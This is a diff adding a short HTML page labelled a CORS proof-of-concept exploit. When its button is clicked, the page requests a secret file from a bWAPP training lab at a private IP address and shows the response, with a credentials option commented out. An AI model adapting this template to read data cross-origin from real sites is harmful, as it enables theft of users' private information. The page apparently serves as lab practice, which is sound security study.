@@ -1,0 +1,35 @@
+<html>
+<head>
+	<title>CORS POC</title>
+</head>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+
+<script>
+function cors(){
+	
+	var req;
+	if(window.XMLHttpRequest){
+		req = new XMLHttpRequest();
+	}else{
+		req = new ActiveXObject("Microsoft.XMLHTTP");
+	}
+
+	req.onreadystatechange = function() {
+		if (req.readyState == 4 && req.status === 200) {
+			document.getElementById("demo").innerHTML = req.responseText;
+		}
+	};
+	req.open("GET", "http://192.168.18.72/bWAPP/bWAPP/secret-cors-1.php", "true");
+	//req.withCredentials = true;
+	req.send();
+}
+</script>
+</script>
+</body>
+</html>
